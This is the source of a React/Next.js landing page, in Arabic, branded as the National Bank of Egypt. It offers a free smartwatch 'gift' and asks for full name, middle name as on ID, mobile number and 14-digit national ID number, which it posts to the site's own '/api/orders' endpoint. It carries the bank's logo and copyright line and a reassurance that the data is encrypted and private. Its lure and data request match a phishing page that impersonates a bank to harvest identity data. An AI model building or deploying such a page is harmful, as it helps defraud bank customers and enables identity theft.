'use client';

import { useRef, useState, type FormEvent } from 'react';

const products = [
  { name: 'جرين', color: 'أخضر', tone: 'green', image: '/manus-storage/watch-nbe-green_7ca0e659.webp', price: 'هدية حصرية', tag: 'حصري', gender: 'رجالي', title: 'الأهلي جرين', desc: 'إطلالة جريئة بروح الأهلي' },
  { name: 'روز', color: 'روز', tone: 'rose', image: '/manus-storage/watch-nbe-rosegold_93ebd299.webp', price: 'هدية حصرية', tag: 'الأكثر طلبًا', gender: 'نسائي', title: 'الأهلي روز', desc: 'أناقة ناعمة تليق بك' },
  { name: 'أسود', color: 'أسود', tone: 'black', image: '/manus-storage/watch-nbe-black_22f4a078.webp', price: 'هدية حصرية', tag: 'حصري', gender: 'رجالي', title: 'الأهلي بلاك', desc: 'حضور قوي في كل وقت' },
  { name: 'أبيض', color: 'أبيض', tone: 'white', image: '/manus-storage/watch-nbe-white_fd281437.webp', price: 'إصدار جديد', tag: 'جديد', gender: 'كلاسيكي', title: 'الأهلي وايت', desc: 'بساطة تكمّل يومك' },
];

function LogoSymbol({ small }: { small?: boolean }) {
  return (
    <span className={`logo-symbol${small ? ' small' : ''}`} aria-hidden="true">
      <i /><i /><i />
    </span>
  );
}

export default function HomePage() {
  const [selected, setSelected] = useState(products[0]);
  const [toast, setToast] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const toastTimer = useRef<ReturnType<typeof setTimeout>>(null);

  function showToast(msg: string) {
    setToast(msg);
    if (toastTimer.current) clearTimeout(toastTimer.current);
    toastTimer.current = setTimeout(() => setToast(''), 3600);
  }

  function scrollTo(id: string) {
    document.querySelector(id)?.scrollIntoView({ behavior: 'smooth' });
  }

  function selectProduct(p: typeof products[0]) {
    setSelected(p);
    scrollTo('#details');
    showToast(`تم اختيار ساعة الأهلي ${p.name}`);
  }

  async function handleSubmit(e: FormEvent<HTMLFormElement>) {
    e.preventDefault();
    const form = e.currentTarget;
    if (!form.checkValidity()) { form.reportValidity(); return; }
    const fd = new FormData(form);
    setSubmitting(true);
    try {
      const res = await fetch('/api/orders', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: fd.get('name'),
          middle: fd.get('middle'),
          phone: fd.get('phone'),
          national: fd.get('national'),
          watchName: selected.name,
          watchColor: selected.color,
        }),
      });
      if (!res.ok) throw new Error('fail');
      showToast('تم استلام طلبك بنجاح — سنتواصل معك قريبًا.');
      form.reset();
    } catch {
      showToast('تعذر حفظ الطلب حاليًا. حاول مرة أخرى.');
    } finally {
      setSubmitting(false);
    }
  }

  return (
    <>
      <div className="site-wrap">
        <header className="topbar">
          <div className="topbar-inner">
            <a className="nbe-logo" href="#home" aria-label="البنك الأهلي المصري">
              <LogoSymbol />
              <span className="logo-copy"><strong>البنك الأهلي المصري</strong><small>NATIONAL BANK OF EGYPT</small></span>
            </a>
            <button className="top-action" type="button" onClick={() => scrollTo('#register')}>ابدأ الآن <span>←</span></button>
          </div>
        </header>

        <main>
          <section className="hero-nbe" id="home">
            <div className="hero-pattern" />
            <div className="container hero-content">
              <div className="nbe-pill"><span className="mini-shield">⌾</span> البنك الأهلي المصري</div>
              <h1>تجربة مصرفية<br /><span>ذكية</span></h1>
              <p>ساعة الأهلي الذكية تجمع بين الأناقة والأداء المصرفي بأمان لا يُضاهى.</p>
              <div className="hero-features">
                <div className="hero-feature"><span>⌾</span><b>حماية تامة</b></div>
                <div className="hero-feature"><span>▣</span><b>دفع ذكي</b></div>
                <div className="hero-feature"><span>♔</span><b>هدية حصرية</b></div>
              </div>
              <div className="loading-line"><span /></div>
              <p className="loading-label">اكتشف عالمًا جديدًا من الخدمات</p>
            </div>
          </section>

          <section className="intro section-light">
            <div className="container intro-grid">
              <div className="section-kicker">إصدار محدود من البنك الأهلي المصري</div>
              <h2>ساعة الأهلي الذكية</h2>
              <p>ادفع بلمسة واحدة من معصمك، واستمتع بتجربة مصرفية متكاملة بأناقة لا تضاهى.</p>
              <div className="intro-note">متوفرة بألوان مميزة للرجال والنساء</div>
            </div>
          </section>

          <section className="benefit-strip section-light" aria-label="مميزات الساعة">
            <div className="container benefit-grid">
              <article className="benefit-card"><span className="benefit-icon gift">♔</span><h3>هدية مجانية</h3><p>لعملائنا المميزين</p></article>
              <article className="benefit-card"><span className="benefit-icon shield">⌾</span><h3>حماية بنكية</h3><p>تشفير متقدم</p></article>
              <article className="benefit-card"><span className="benefit-icon sparkle">✧</span><h3>تصميم مصري</h3><p>بشعار الأهلي</p></article>
            </div>
          </section>

          <section className="products section-light" id="products">
            <div className="container">
              <div className="section-title"><span>اختيارك يعكس ذوقك</span><h2>ألوان تليق بذوقك</h2><p>اختر الساعة التي تناسب أسلوب حياتك</p></div>
              <div className="product-grid">
                {products.map((p) => (
                  <article key={p.tone} className="product-card">
                    <span className="tag">{p.tag}</span>
                    <div className={`product-watch has-render ${p.tone}`}>
                      <img className="watch-render" src={p.image} alt={`ساعة ذكية ${p.color} بشاشة تحمل شعار البنك الأهلي المصري`} />
                    </div>
                    <div className="product-info">
                      <small>{p.gender}</small>
                      <h3>{p.title}</h3>
                      <p>{p.desc}</p>
                      <button className="select-product" type="button" onClick={() => selectProduct(p)}>اطلب <span>←</span></button>
                    </div>
                  </article>
                ))}
              </div>
            </div>
          </section>

          <section className="detail section-light" id="details">
            <div className="container detail-card">
              <div className="detail-product">
                <div className={`product-watch has-render large ${selected.tone}`}>
                  <img className="watch-render" src={selected.image} alt={`ساعة الأهلي ${selected.name} الذكية`} />
                </div>
              </div>
              <div className="detail-copy">
                <div className="section-kicker">ساعة الأهلي {selected.name}</div>
                <h2>{selected.name === 'روز' ? 'إطلالة ناعمة' : 'إطلالة جريئة'}<br /><span>بروح الأهلي</span></h2>
                <p>ساعة ذكية أنيقة باللون {selected.color} المميز، حزام مريح وتصميم عملي، تجمع بين الأداء اليومي والهوية المصرفية للبنك الأهلي.</p>
                <div className="specs">
                  <span>✓ لون {selected.color} مميز</span>
                  <span>✓ مقاومة للماء</span>
                  <span>✓ حزام سيليكون مرن</span>
                  <span>✓ تتبع النشاط البدني</span>
                </div>
                <button className="primary-button" type="button" onClick={() => scrollTo('#register')}>
                  {selected.price === 'هدية حصرية' ? 'احصل على هذه الساعة مجانًا' : 'اطلب هذه الساعة الآن'} <span>←</span>
                </button>
              </div>
            </div>
          </section>

          <section className="register section-light" id="register">
            <div className="container register-card">
              <div className="section-kicker">خطوتك الأولى نحو تجربة أذكى</div>
              <h2>البيانات الشخصية</h2>
              <p>يرجى إدخال بياناتك بدقة كما تظهر في وثائقك الرسمية</p>
              <form onSubmit={handleSubmit} noValidate>
                <label>الاسم الكامل<input name="name" type="text" placeholder="أدخل اسمك الكامل" required /></label>
                <label>الاسم الثاني كما في الهوية<input name="middle" type="text" placeholder="أدخل اسمك الثاني كما في الهوية" required /></label>
                <label>رقم الهاتف المحمول<input name="phone" type="tel" placeholder="01XXXXXXXXX" required /></label>
                <label>الرقم القومي<input name="national" type="text" placeholder="رقمًا 14" minLength={14} maxLength={14} required /></label>
                <p className="form-note">يجب أن يكون الرقم القومي من 14 رقمًا مطابقًا لبطاقتك</p>
                <button className="primary-button submit-button" type="submit" disabled={submitting}>
                  {submitting ? 'جارٍ حفظ الطلب...' : 'متابعة التسجيل'}
                </button>
                <small className="privacy-note">🔒 بياناتك مشفّرة ولن تشارك مع أي طرف خارجي</small>
              </form>
            </div>
          </section>
        </main>

        <footer className="footer">
          <div className="container">
            <div className="footer-logo"><LogoSymbol small /><strong>البنك الأهلي المصري</strong></div>
            <p>تجربة مصرفية ذكية تبدأ من معصمك.</p>
            <small>© 2024 البنك الأهلي المصري — جميع الحقوق محفوظة</small>
          </div>
        </footer>
      </div>
      <div className={`toast${toast ? ' show' : ''}`} role="status" aria-live="polite">{toast}</div>
    </>
  );
}
